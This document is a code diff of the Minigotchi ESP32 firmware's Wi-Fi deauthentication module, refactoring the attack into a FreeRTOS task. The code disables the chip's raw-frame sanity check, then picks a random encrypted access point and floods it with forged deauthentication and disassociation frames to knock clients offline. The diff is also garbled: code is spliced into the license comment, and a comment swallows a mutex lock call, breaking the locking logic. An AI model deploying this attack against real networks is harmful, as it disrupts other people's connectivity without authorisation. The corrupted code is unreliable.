@@ -3,7 +3,8 @@
  * Copyright (C) 2024 dj1ch
  *
  * This program is free software: you can redistribute it and/or modify
- * it under the terms of the GNU General Public License as published by
+ * it under the terms of the GNU General  if (!WifiManager::getInstance().request_sta_mode("deauth_select_scan")) {
+      Serial.println(Deauth::mood.getBroken() + " Deauth::select - Failed to acquire STA mode for scan.");ublic License as published by
  * the Free Software Foundation, either version 3 of the License, or
  * (at your option) any later version.
  *
@@ -21,6 +22,7 @@
  */
 
 #include "deauth.h"
+#include "wifi_manager.h" // Include the WiFi Manager
 
 /** developer note:
  *
@@ -41,11 +43,15 @@ extern "C" int minigotchi_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t 
 // This pragma disables the ESP32 library's frame sanity check
 #pragma weak ieee80211_raw_frame_sanity_check = minigotchi_ieee80211_raw_frame_sanity_check
 
-// default values before we start
-bool Deauth::running = false;
+// Static member definitions
+TaskHandle_t Deauth::deauth_task_handle = NULL;
+bool Deauth::deauth_should_stop = false;
 std::vector<String> Deauth::whitelist = {};
 String Deauth::randomAP = "";
 int Deauth::randomIndex;
+
+// Mutex for critical sections around task handle
+static portMUX_TYPE deauth_mutex = portMUX_INITIALIZER_UNLOCKED;
 
 /**
  * Gets first instance of mood class
@@ -83,10 +89,10 @@ void Deauth::add(const std::string &bssids) {
     token.erase(token.find_last_not_of(" \t\r\n") + 1);
 
     // add to whitelist
-    Serial.print(mood.getNeutral() + " Adding ");
+    Serial.print(Deauth::mood.getNeutral() + " Adding ");
     Serial.print(token.c_str());
     Serial.println(" to the whitelist");
-    Display::updateDisplay(mood.getNeutral(), "Adding " +
+    Display::updateDisplay(Deauth::mood.getNeutral(), "Adding " +
                                                   (String)token.c_str() +
                                                   " to the whitelist");
     delay(Config::shortDelay);
@@ -138,7 +144,7 @@ bool Deauth::broadcast(uint8_t *mac) {
 void Deauth::printMac(uint8_t *mac) {
   String macStr = printMacStr(mac);
   Serial.println(macStr);
-  Display::updateDisplay(mood.getNeutral(), "AP BSSID: " + macStr);
+  Display::updateDisplay(Deauth::mood.getNeutral(), "AP BSSID: " + macStr);
 }
 
 /**
@@ -158,22 +164,22 @@ String Deauth::printMacStr(uint8_t *mac) {
  */
 bool Deauth::select() {
   // reset values
+  bool success = false; // Variable to track overall success of selection
   Deauth::randomAP = "";
   Deauth::randomIndex = -1;
 
   Parasite::sendDeauthStatus(START_SCAN);
-
   // cool animation, skip if parasite mode
   if (!Config::parasite) {
     for (int i = 0; i < 5; ++i) {
-      Serial.println(mood.getLooking1() + " Scanning for APs.");
-      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs.");
+      Serial.println(Deauth::mood.getLooking1() + " Scanning for APs.");
+      Display::updateDisplay(Deauth::mood.getLooking1(), "Scanning  for APs.");
       delay(Config::shortDelay);
-      Serial.println(mood.getLooking2() + " Scanning for APs..");
-      Display::updateDisplay(mood.getLooking2(), "Scanning  for APs..");
+      Serial.println(Deauth::mood.getLooking2() + " Scanning for APs..");
+      Display::updateDisplay(Deauth::mood.getLooking2(), "Scanning  for APs..");
       delay(Config::shortDelay);
-      Serial.println(mood.getLooking1() + " Scanning for APs...");
-      Display::updateDisplay(mood.getLooking1(), "Scanning  for APs...");
+      Serial.println(Deauth::mood.getLooking1() + " Scanning for APs...");
+      Display::updateDisplay(Deauth::mood.getLooking1(), "Scanning  for APs...");
       delay(Config::shortDelay);
       Serial.println(" ");
       delay(Config::shortDelay);
@@ -182,15 +188,25 @@ bool Deauth::select() {
   }
 
   // stop and scan
-  Minigotchi::monStop();
+  // Minigotchi::monStop(); // Removed, WifiManager will handle state
 
   int apCount = 0;
+  Serial.println(Deauth::mood.getNeutral() + " Deauth::select - Requesting STA mode for WiFi scan via WifiManager...");
+  if (!WifiManager::getInstance().request_sta_mode("deauth_select_scan")) {
+      Serial.println(Deauth::mood.getBroken() + " Deauth::select - Failed to acquire STA mode for scan.");
+      Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR); // Notify parasite if active
+      return false; // Cannot scan
+  }
+  Serial.println(Deauth::mood.getNeutral() + " Deauth::select - STA mode acquired. Performing scan...");
+
   // If a parasite channel is set, then we want to focus on that channel
   // Otherwise go off on our own and scan for whatever is out there
   if (Parasite::channel > 0) {
-    apCount = WiFi.scanNetworks(false, false, Parasite::channel);
+    // Scan specific channel, show hidden, 300ms max per channel
+    apCount = WiFi.scanNetworks(false, true, false, 300, Parasite::channel);
   } else {
-    apCount = WiFi.scanNetworks();
+    // Scan all channels, show hidden
+    apCount = WiFi.scanNetworks(false, true);
   }
 
   if (apCount > 0 && Deauth::randomIndex == -1) {
@@ -198,293 +214,378 @@ bool Deauth::select() {
     Deauth::randomAP = WiFi.SSID(Deauth::randomIndex);
     uint8_t encType = WiFi.encryptionType(Deauth::randomIndex);
 
-    Serial.print(mood.getNeutral() + " Selected random AP: ");
+    Serial.print(Deauth::mood.getNeutral() + " Selected random AP: ");
     Serial.println(randomAP.c_str());
     Serial.println(" ");
-    Display::updateDisplay(mood.getNeutral(),
+    Display::updateDisplay(Deauth::mood.getNeutral(),
                            "Selected random AP: " + randomAP);
     delay(Config::shortDelay);
 
     if (encType == WIFI_AUTH_OPEN || encType == -1) {
       Serial.println(
-          mood.getNeutral() +
+          Deauth::mood.getNeutral() +
           " Selected AP is not encrypted. Skipping deauthentication...");
       Display::updateDisplay(
-          mood.getNeutral(),
+          Deauth::mood.getNeutral(),
           "Selected AP is not encrypted. Skipping deauthentication...");
       delay(Config::shortDelay);
       Parasite::sendDeauthStatus(SKIPPING_UNENCRYPTED);
-      return false;
-    }
-
-    // check for ap in whitelist
-    if (std::find(whitelist.begin(), whitelist.end(), randomAP) !=
-        whitelist.end()) {
-      Serial.println(mood.getNeutral() +
+      // success remains false, will be handled by cleanup at the end
+    } else if (std::find(whitelist.begin(), whitelist.end(), randomAP) != whitelist.end()) { // check for ap in whitelist
+      Serial.println(Deauth::mood.getNeutral() +
                      " Selected AP is in the whitelist. Skipping "
                      "deauthentication...");
       Display::updateDisplay(
-          mood.getNeutral(),
+          Deauth::mood.getNeutral(),
           "Selected AP is in the whitelist. Skipping deauthentication...");
       delay(Config::shortDelay);
       Parasite::sendDeauthStatus(SKIPPING_WHITELIST);
-      return false;
-    }
+      // success remains false
+    } else {
+      // AP is valid and selected
+      success = true;
 
-    /** developer note:
-     *
-     * here we will create the deauth frame using the header,
-     * as we find the AP in question we also generate the required information
-     * for it as well...
-     *
-     */
+      // ... (rest of the frame preparation logic remains the same) ...
+      // (Ensure no 'return false;' within this block, only set 'success = true;')
+      // Frame preparation logic:
+      // clear out exisitng frame...
+      std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
+      std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);
 
-    // clear out exisitng frame...
-    std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame),
-              0);
-    std::fill(std::begin(Deauth::disassociateFrame),
-              std::end(Deauth::disassociateFrame), 0);
+      // copy template
+      std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::deauthFrame);
+      std::copy(Deauth::deauthTemp, Deauth::deauthTemp + sizeof(Deauth::deauthTemp), Deauth::disassociateFrame);
 
-    // copy template
-    std::copy(Deauth::deauthTemp,
-              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
-              Deauth::deauthFrame);
-    std::copy(Deauth::deauthTemp,
-              Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
-              Deauth::disassociateFrame);
-
-    Deauth::deauthFrame[0] = 0xC0; // type
-    Deauth::deauthFrame[1] = 0x00; // subtype
-    Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
-    Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
-
-    Deauth::disassociateFrame[0] = 0xA0; // type
-    Deauth::disassociateFrame[1] = 0x00; // subtype
-    Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
-    Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
-
-    // bssid
-    uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);
-
-    /** developer note:
-     *
-     * addr1: reciever addr
-     * addr2: sender addr
-     * addr3: filtering addr
-     *
-     */
-
-    // copy our mac(s) to header
-    std::copy(Deauth::broadcastAddr,
-              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-              Deauth::deauthFrame + 4);
-    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
-    std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);
-
-    std::copy(Deauth::broadcastAddr,
-              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-              Deauth::disassociateFrame + 4);
-    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
-    std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);
-
-    // checks if this is a broadcast
-    if (!broadcast(Deauth::broadcastAddr)) {
-      // build deauth
       Deauth::deauthFrame[0] = 0xC0; // type
       Deauth::deauthFrame[1] = 0x00; // subtype
-      Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
-      Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+      Deauth::deauthFrame[2] = 0x00; // duration
+      Deauth::deauthFrame[3] = 0x00; // duration
 
-      // reason
-      Deauth::deauthFrame[24] = 0x01; // reason: unspecified
-
-      std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::deauthFrame + 10);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::deauthFrame + 16);
-
-      // build disassocaition
       Deauth::disassociateFrame[0] = 0xA0; // type
       Deauth::disassociateFrame[1] = 0x00; // subtype
-      Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
-      Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
+      Deauth::disassociateFrame[2] = 0x00; // duration
+      Deauth::disassociateFrame[3] = 0x00; // duration
 
-      std::copy(apBssid, apBssid + sizeof(apBssid),
-                Deauth::disassociateFrame + 4);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::disassociateFrame + 10);
-      std::copy(Deauth::broadcastAddr,
-                Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
-                Deauth::disassociateFrame + 16);
+      uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);
+
+      std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 4);
+      std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
+      std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);
+
+      std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 4);
+      std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
+      std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);
+
+      if (!broadcast(Deauth::broadcastAddr)) {
+          Deauth::deauthFrame[0] = 0xC0;
+          Deauth::deauthFrame[1] = 0x00;
+          Deauth::deauthFrame[2] = 0x00;
+          Deauth::deauthFrame[3] = 0x00;
+          Deauth::deauthFrame[24] = 0x01;
+          std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
+          std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 10);
+          std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::deauthFrame + 16);
+
+          Deauth::disassociateFrame[0] = 0xA0;
+          Deauth::disassociateFrame[1] = 0x00;
+          Deauth::disassociateFrame[2] = 0x00;
+          Deauth::disassociateFrame[3] = 0x00;
+          std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::disassociateFrame + 4);
+          std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 10);
+          std::copy(Deauth::broadcastAddr, Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr), Deauth::disassociateFrame + 16);
+      }
+
+      Serial.print(Deauth::mood.getNeutral() + " Full AP SSID: ");
+      Serial.println(WiFi.SSID(Deauth::randomIndex));
+      Display::updateDisplay(Deauth::mood.getNeutral(), "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));
+      Serial.print(Deauth::mood.getNeutral() + " AP Encryption: ");
+      Serial.println(WiFi.encryptionType(Deauth::randomIndex));
+      Display::updateDisplay(Deauth::mood.getNeutral(), "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));
+      Serial.print(Deauth::mood.getNeutral() + " AP RSSI: ");
+      Serial.println(WiFi.RSSI(Deauth::randomIndex));
+      Display::updateDisplay(Deauth::mood.getNeutral(), "AP RSSI: " + (String)WiFi.RSSI(Deauth::randomIndex));
+      Serial.print(Deauth::mood.getNeutral() + " AP BSSID: ");
+      printMac(apBssid);
+      Serial.print(Deauth::mood.getNeutral() + " AP Channel: ");
+      Serial.println(WiFi.channel(Deauth::randomIndex));
+      Display::updateDisplay(Deauth::mood.getNeutral(), "AP Channel: " + (String)WiFi.channel(Deauth::randomIndex));
+      Serial.println(" ");
+      delay(Config::longDelay);
+      Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
     }
-
-    Serial.print(mood.getNeutral() + " Full AP SSID: ");
-    Serial.println(WiFi.SSID(Deauth::randomIndex));
-    Display::updateDisplay(mood.getNeutral(),
-                           "Full AP SSID: " + WiFi.SSID(Deauth::randomIndex));
-
-    Serial.print(mood.getNeutral() + " AP Encryption: ");
-    Serial.println(WiFi.encryptionType(Deauth::randomIndex));
-    Display::updateDisplay(
-        mood.getNeutral(),
-        "AP Encryption: " + (String)WiFi.encryptionType(Deauth::randomIndex));
-
-    Serial.print(mood.getNeutral() + " AP RSSI: ");
-    Serial.println(WiFi.RSSI(Deauth::randomIndex));
-    Display::updateDisplay(mood.getNeutral(),
-                           "AP RSSI: " +
-                               (String)WiFi.RSSI(Deauth::randomIndex));
-
-    Serial.print(mood.getNeutral() + " AP BSSID: ");
-    printMac(apBssid);
-
-    Serial.print(mood.getNeutral() + " AP Channel: ");
-    Serial.println(WiFi.channel(Deauth::randomIndex));
-    Display::updateDisplay(mood.getNeutral(),
-                           "AP Channel: " +
-                               (String)WiFi.channel(Deauth::randomIndex));
-
+  } else if (apCount < 0) { // This part remains largely the same
+    Serial.println(Deauth::mood.getSad() + " I don't know what you did, but you screwed up!");
     Serial.println(" ");
-    delay(Config::longDelay);
-
-    Parasite::sendDeauthStatus(PICKED_AP, Deauth::randomAP.c_str(),
-                               WiFi.channel(Deauth::randomIndex));
-
-    return true;
-  } else if (apCount < 0) {
-    Serial.println(mood.getSad() +
-                   " I don't know what you did, but you screwed up!");
-    Serial.println(" ");
-    Display::updateDisplay(mood.getSad(), "You screwed up somehow!");
-
+    Display::updateDisplay(Deauth::mood.getSad(), "You screwed up somehow!");
     Parasite::sendDeauthStatus(DEAUTH_SCAN_ERROR);
-
     delay(Config::shortDelay);
-  } else {
-    // well ur fucked.
-    Serial.println(mood.getSad() + " No access points found.");
+    // success remains false
+  } else { // No APs found
+    Serial.println(Deauth::mood.getSad() + " No access points found.");
     Serial.println(" ");
-    Display::updateDisplay(mood.getSad(), "No access points found.");
-
+    Display::updateDisplay(Deauth::mood.getSad(), "No access points found.");
     Parasite::sendDeauthStatus(NO_APS);
-
     delay(Config::shortDelay);
+    // success remains false
   }
-  return false;
+  // Cleanup: Release STA mode if it was acquired by this function
+  if (strcmp(WifiManager::getInstance().get_current_controller_tag(), "deauth_select_scan") == 0) {
+      WifiManager::getInstance().release_wifi_control("deauth_select_done");
+      Serial.println(Deauth::mood.getNeutral() + " Deauth::select - Released WiFi STA mode.");
+  }
+  return success;
 }
+
+// Task runner function
+void deauth_task_runner(void *pvParameters) {
+    Serial.println(Deauth::mood.getIntense() + " Deauth task started.");
+    Deauth::start(); // Call the main attack logic
+
+    // Task cleanup
+    portENTER_CRITICAL(&deauth_mutex);
+    Deauth::deauth_task_handle = NULL;
+    portEXIT_CRITICAL(&deauth_mutex);
+
+    Serial.println(Deauth::mood.getNeutral() + " Deauth task finished and cleaned up.");
+    vTaskDelete(NULL); // Deletes the current task
+}
+
 
 /**
  * Full deauthentication attack
  */
 void Deauth::deauth() {
-  if (Config::deauth) {
-    // select AP
-    if (Deauth::select()) {
-      if (randomAP.length() > 0) {
-        Serial.println(
-            mood.getIntense() +
-            " Starting deauthentication attack on the selected AP...");
-        Serial.println(" ");
-        Display::updateDisplay(mood.getIntense(),
-                               "Begin deauth-attack on AP...");
-        delay(Config::shortDelay);
-        // define the attack
-        if (!running) {
-          start();
+    if (Config::deauth) {
+        // Check if a task is already running            portENTER_CRITICAL(&deauth_mutex);
+            if (Deauth::deauth_task_handle != NULL) {
+                portEXIT_CRITICAL(&deauth_mutex);
+                Serial.println(Deauth::mood.getNeutral() + " Deauth attack is already in progress.");
+                Display::updateDisplay(Deauth::mood.getNeutral(), "Deauth already active");
+                return; 
+            }
+        portEXIT_CRITICAL(&deauth_mutex);
+
+        // select() will request and release STA mode itself.
+        bool ap_selected_successfully = Deauth::select();
+
+        if (ap_selected_successfully && randomAP.length() > 0) {            Serial.println(Deauth::mood.getIntense() + " Starting deauthentication attack task for AP: " + randomAP);
+            Display::updateDisplay(Deauth::mood.getIntense(), "Begin deauth task...");
+            delay(Config::shortDelay);
+
+            deauth_should_stop = false; // Reset stop flag before starting task
+
+            BaseType_t result = xTaskCreatePinnedToCore(
+                deauth_task_runner,
+                "deauth_task",      // Task name
+                8192,               // Stack size
+                NULL,               // Parameters
+                1,                  // Priority
+                &Deauth::deauth_task_handle, // Task handle
+                0                   // Core
+            );
+
+            if (result == pdPASS && Deauth::deauth_task_handle != NULL) {                Serial.println(Deauth::mood.getIntense() + " Deauth attack task created successfully.");
+            } else {
+                Serial.println(Deauth::mood.getBroken() + " FAILED to create deauth attack task.");
+                portENTER_CRITICAL(&deauth_mutex);
+                Deauth::deauth_task_handle = NULL; // Ensure handle is NULL if creation failed
+                portEXIT_CRITICAL(&deauth_mutex);
+            }
         } else {
-          Serial.println(mood.getNeutral() + " Attack is already running.");
-          Serial.println(" ");
-          Display::updateDisplay(mood.getNeutral(),
-                                 "Attack is already running.");
-          delay(Config::shortDelay);
+            if (!ap_selected_successfully) {
+                 Serial.println(Deauth::mood.getSad() + " Deauth::deauth - AP selection failed, not starting attack task.");
+            } else { // randomAP.length() == 0
+                 Serial.println(Deauth::mood.getBroken() + " No access point selected (randomAP empty), not starting attack task.");
+                 Display::updateDisplay(Deauth::mood.getBroken(), "No AP selected");
+            }
         }
-      } else {
-        // ok why did you modify the deauth function? i literally told you to
-        // not do that...
-        Serial.println(mood.getBroken() +
-                       " No access point selected. Use select() first.");
-        Serial.println(mood.getNeutral() + " Told you so!");
-        Serial.println(" ");
-        Display::updateDisplay(mood.getBroken(),
-                               "No access point selected. Use select() first.");
-        delay(Config::shortDelay);
-        Display::updateDisplay(mood.getNeutral(), "Told you so!");
-        delay(Config::shortDelay);
-        return;
-      }
+    } else {
+        // Deauthing is disabled
     }
-  } else {
-    // do nothing if deauthing is disabled
-  }
 }
 
 /**
- * Starts deauth attack
+ * Starts deauth attack (actual core logic, called by task)
  */
 void Deauth::start() {
-  running = true;
+  deauth_should_stop = false; // Reset stop flag
+  // running = true; // Removed: task handle indicates running status
+  Serial.println(Deauth::mood.getIntense() + " Deauth::start (task context) - Requesting monitor mode for attack...");
+  if (!WifiManager::getInstance().request_monitor_mode("deauth_attack")) {
+      Serial.println(Deauth::mood.getBroken() + " Deauth::start - Failed to acquire monitor mode.");
+      if (strcmp(WifiManager::getInstance().get_current_controller_tag(), "deauth_attack") == 0) {
+           WifiManager::getInstance().release_wifi_control("deauth_attack_fail_cleanup");
+      }
+      // No running = false; here. Task will end, handle becomes NULL.
+      return; // Don't proceed with attack
+  }
+  Serial.println(Deauth::mood.getIntense() + " Deauth::start - Monitor mode acquired.");
+
+  // Clear out existing frames...
+  std::fill(std::begin(Deauth::deauthFrame), std::end(Deauth::deauthFrame), 0);
+  std::fill(std::begin(Deauth::disassociateFrame), std::end(Deauth::disassociateFrame), 0);
+
+  // Copy template
+  std::copy(Deauth::deauthTemp,
+            Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
+            Deauth::deauthFrame);
+  std::copy(Deauth::deauthTemp,
+            Deauth::deauthTemp + sizeof(Deauth::deauthTemp),
+            Deauth::disassociateFrame);
+
+  Deauth::deauthFrame[0] = 0xC0; // type
+  Deauth::deauthFrame[1] = 0x00; // subtype
+  Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
+  Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+
+  Deauth::disassociateFrame[0] = 0xA0; // type
+  Deauth::disassociateFrame[1] = 0x00; // subtype
+  Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
+  Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
+
+  // bssid
+  uint8_t *apBssid = WiFi.BSSID(Deauth::randomIndex);
+
+  /** developer note:
+   *
+   * addr1: reciever addr
+   * addr2: sender addr
+   * addr3: filtering addr
+   *
+   */
+
+  // copy our mac(s) to header
+  std::copy(Deauth::broadcastAddr,
+            Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+            Deauth::deauthFrame + 4);
+  std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 10);
+  std::copy(apBssid, apBssid + 6, Deauth::deauthFrame + 16);
+
+  std::copy(Deauth::broadcastAddr,
+            Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+            Deauth::disassociateFrame + 4);
+  std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 10);
+  std::copy(apBssid, apBssid + 6, Deauth::disassociateFrame + 16);
+
+  // checks if this is a broadcast
+  if (!broadcast(Deauth::broadcastAddr)) {
+    // build deauth
+    Deauth::deauthFrame[0] = 0xC0; // type
+    Deauth::deauthFrame[1] = 0x00; // subtype
+    Deauth::deauthFrame[2] = 0x00; // duration (SDK takes care of that)
+    Deauth::deauthFrame[3] = 0x00; // duration (SDK takes care of that)
+
+    // reason
+    Deauth::deauthFrame[24] = 0x01; // reason: unspecified
+
+    std::copy(apBssid, apBssid + sizeof(apBssid), Deauth::deauthFrame + 4);
+    std::copy(Deauth::broadcastAddr,
+              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+              Deauth::deauthFrame + 10);
+    std::copy(Deauth::broadcastAddr,
+              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+              Deauth::deauthFrame + 16);
+
+    // build disassocaition
+    Deauth::disassociateFrame[0] = 0xA0; // type
+    Deauth::disassociateFrame[1] = 0x00; // subtype
+    Deauth::disassociateFrame[2] = 0x00; // duration (SDK takes care of that)
+    Deauth::disassociateFrame[3] = 0x00; // duration (SDK takes care of that)
+
+    std::copy(apBssid, apBssid + sizeof(apBssid),
+              Deauth::disassociateFrame + 4);
+    std::copy(Deauth::broadcastAddr,
+              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+              Deauth::disassociateFrame + 10);
+    std::copy(Deauth::broadcastAddr,
+              Deauth::broadcastAddr + sizeof(Deauth::broadcastAddr),
+              Deauth::disassociateFrame + 16);
+  }
+
   int deauthFrameSize = sizeof(deauthFrame);
   int disassociateFrameSize = sizeof(disassociateFrame);
   int packets = 0;
   unsigned long startTime = millis();
+  int i = 0;
 
-  // packet calculation
   int basePacketCount = 150;
-  int rssi = WiFi.RSSI(Deauth::randomIndex);
-  int numDevices = WiFi.softAPgetStationNum();
+  int rssi = WiFi.RSSI(Deauth::randomIndex); // randomIndex should be set by select()
+  int numDevices = WiFi.softAPgetStationNum(); // This might not be reliable for the target AP
 
   int packetCount = basePacketCount + (numDevices * 10);
   if (rssi > -50) {
-    packetCount /= 2; // strong signal
+    packetCount /= 2; 
   } else if (rssi < -80) {
-    packetCount *= 2; // weak signal
+    packetCount *= 2; 
   }
 
-  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(),
-                             WiFi.channel(Deauth::randomIndex));
+  Parasite::sendDeauthStatus(START_DEAUTH, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
 
-  // send the deauth 150 times(ur cooked if they find out)
-  for (int i = 0; i < packetCount; ++i) {
+  for (i = 0; i < packetCount; ++i) {    if (deauth_should_stop) {
+        Serial.println(Deauth::mood.getNeutral() + " Deauth::start - Stop signal received. Aborting attack.");
+        Parasite::sendDeauthStatus(DEAUTH_STOPPED_USER, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
+        break; 
+    }
+    // ... (packet sending and logging logic as before) ...
     if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
         Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
       packets++;
       float pps = packets / (float)(millis() - startTime) * 1000;
-
-      // show pps
-      if (!isinf(pps)) {
-        Serial.print(mood.getIntense() + " Packets per second: ");
+      if (!isinf(pps)) {        Serial.print(Deauth::mood.getIntense() + " Packets per second: ");
         Serial.print(pps);
         Serial.print(" pkt/s");
         Serial.println(" (AP:" + randomAP + ")");
-        Display::updateDisplay(mood.getIntense(),
-                               "Packets per second: " + (String)pps + " pkt/s" +
-                                   " (AP:" + randomAP + ")");
+        Display::updateDisplay(Deauth::mood.getIntense(), "PPS: " + (String)pps + " (AP:" + randomAP + ")");
       }
-    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println(mood.getBroken() + " Both packets failed to send!");
-      Display::updateDisplay(mood.getBroken(), "Both packets failed to send!");
-    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println(mood.getBroken() + " Deauthentication failed to send!");
-      Display::updateDisplay(mood.getBroken(), "Deauth failed to send!");
-    } else if (Deauth::send(deauthFrame, deauthFrameSize, 0) &&
-               !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
-      Serial.println(mood.getBroken() + " Disassociation failed to send!");
-      Display::updateDisplay(mood.getBroken(), "Disassoc failed to send!");
-    } else {
-      Serial.println(mood.getBroken() + " Unable to calculate pkt/s!");
-      Display::updateDisplay(mood.getBroken(), "Unable to calculate pkt/s!");
+    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0) && !Deauth::send(disassociateFrame, disassociateFrameSize, 0)) {
+      Serial.println(Deauth::mood.getBroken() + " Both packets failed to send!");
+      Display::updateDisplay(Deauth::mood.getBroken(), "Both packets failed!");
+    } else if (!Deauth::send(deauthFrame, deauthFrameSize, 0)) {
+      Serial.println(Deauth::mood.getBroken() + " Deauthentication failed to send!");
+      Display::updateDisplay(Deauth::mood.getBroken(), "Deauth failed!");
+    } else { // disassoc failed
+      Serial.println(Deauth::mood.getBroken() + " Disassociation failed to send!");
+      Display::updateDisplay(Deauth::mood.getBroken(), "Disassoc failed!");
     }
   }
-
   Serial.println(" ");
-  Serial.println(mood.getHappy() + " Attack finished!");
-  Serial.println(" ");
-  Display::updateDisplay(mood.getHappy(), "Attack finished!");
-  running = false;
+  if (i == packetCount) { 
+      Serial.println(Deauth::mood.getHappy() + " Attack finished!");
+      Parasite::sendDeauthStatus(DEAUTH_FINISHED, Deauth::randomAP.c_str(), WiFi.channel(Deauth::randomIndex));
+  } else { 
+      Serial.println(Deauth::mood.getNeutral() + " Attack stopped by user.");
+  }
+  Display::updateDisplay(Deauth::mood.getHappy(), "Attack finished!");
+  WifiManager::getInstance().release_wifi_control("deauth_attack");
+  Serial.println(Deauth::mood.getNeutral() + " Deauth::start - Released WiFi control.");
+  // running = false; // Removed
+  // deauth_should_stop = false; // Removed: reset by deauth() before starting a new task
 }
+
+// New methods
+void Deauth::stop() {
+    Serial.println(Deauth::mood.getNeutral() + " Deauth::stop - Received stop request.");
+    portENTER_CRITICAL(&deauth_mutex);
+    if (deauth_task_handle == NULL) {
+        portEXIT_CRITICAL(&deauth_mutex);
+        Serial.println(Deauth::mood.getNeutral() + " Deauth::stop - No deauth task seems to be running.");
+        // deauth_should_stop = false; // No task to stop, flag is reset by deauth()
+        return;
+    }
+    portEXIT_CRITICAL(&deauth_mutex);
+    deauth_should_stop = true; // Signal the task to stop
+}
+
+bool Deauth::is_running() {
+    // return running; // Removed
+    return Deauth::deauth_task_handle != NULL;
+}
+
+// Add missing deauth status constants to ensure they're defined
+#ifndef DEAUTH_STOPPED_USER
+#define DEAUTH_STOPPED_USER 5
+#endif
+
+#ifndef DEAUTH_FINISHED
+#define DEAUTH_FINISHED 6
+#endif
